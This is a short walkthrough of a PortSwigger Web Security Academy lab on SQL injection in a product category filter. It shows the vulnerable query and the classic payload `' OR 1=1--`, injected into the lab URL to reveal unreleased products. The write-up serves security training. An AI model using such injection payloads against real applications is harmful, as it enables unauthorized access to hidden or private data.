# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Lab's description
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

**End goal:** Display one or more unreleased products.

## Solution

Firstly, you go to home page and choose any category.

**Link** `https://0a89005304a405808199a7b6004700ae.web-security-academy.net/filter?category=Lifestyle`

We will see there are only 3 items; then we modify the link by adding `' OR 1=1--`

**Link:** `https://0a89005304a405808199a7b6004700ae.web-security-academy.net/filter?category=Lifestyle%27+OR+1=1--`

After modifying, we can see there are more items added.

**Source:** [Lab: Retrieving hidden data](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data#)
